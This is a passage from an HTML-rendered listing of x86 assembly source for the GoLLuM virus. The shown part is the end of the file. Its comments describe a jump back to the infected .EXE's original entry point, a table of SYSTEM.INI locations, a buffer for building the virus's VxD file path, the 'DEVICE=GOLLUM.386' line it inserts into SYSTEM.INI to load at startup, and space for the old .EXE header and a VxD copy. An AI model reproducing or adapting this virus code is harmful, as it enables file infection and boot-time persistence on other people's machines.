        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc1">;Clear prefetch</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        
        </span><span class="sc1">;Jump to original entry point</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">exe_ip</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">exe_cs</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">

</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
                </span><span class="sc1">;String table</span><span class="sc0">
</span><span class="sc5">Win_Sys_Table</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Win_Sys_01h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Win_Sys_02h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Win_Sys_03h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Win_Sys_04h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Win_Sys_05h</span><span class="sc0">
                </span><span class="sc1">;Posible locations of SYSTEM.INI file</span><span class="sc0">
</span><span class="sc5">Win_Sys_01h</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\WINDOWS\SYSTEM.INI"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        
</span><span class="sc5">Win_Sys_02h</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\WIN\SYSTEM.INI"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        
</span><span class="sc5">Win_Sys_03h</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\WIN31\SYSTEM.INI"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        
</span><span class="sc5">Win_Sys_04h</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\WIN311\SYSTEM.INI"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        
</span><span class="sc5">Win_Sys_05h</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\WIN95\SYSTEM.INI"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        
                </span><span class="sc1">;Buffer where virus build VxD file name and path</span><span class="sc0">
</span><span class="sc5">VxD_File</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc1">;String inserted into SYSTEM.INI</span><span class="sc0">
</span><span class="sc5">Device_String</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc3">"DEVICE=GOLLUM.386"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
                </span><span class="sc1">;Misc data</span><span class="sc0">
</span><span class="sc5">System_Size</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">System_Handle</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc1">;Next bytes = Old .EXE header + VxD file copy</span><span class="sc0">
</span><span class="sc5">Old_Header</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">

</span><span class="sc5">I_am_GoLLuM</span><span class="sc0">     </span><span class="sc9">ends</span><span class="sc0">
                </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">GoLLuM_Entry_Point</span></div></body>
</html>
